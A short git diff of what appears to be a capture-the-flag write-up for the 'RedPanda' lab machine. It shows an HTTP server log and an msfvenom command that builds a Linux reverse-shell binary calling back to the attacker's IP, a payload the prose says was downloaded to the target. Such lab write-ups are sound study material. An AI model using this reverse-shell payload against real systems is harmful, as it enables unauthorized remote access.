@@ -130,7 +130,7 @@ ghost@localhost [01:13:23] [~/Documents/hacking/tj-null-boxes/redpanda] [master 
 -> % python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.170 - - [26/Oct/2022 01:13:32] "GET / HTTP/1.1" 200 -
-```
+```\\
 
 # User
 
@@ -138,7 +138,7 @@ So I generated stageless reverse shell with msfvenom, download to the server and
 
 ```bash
 ghost@localhost [01:22:31] [~/Documents/hacking/tj-null-boxes/redpanda] [master *]
--> % msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f elf > shell.elf
+-> % msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f elf > shell.elf
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
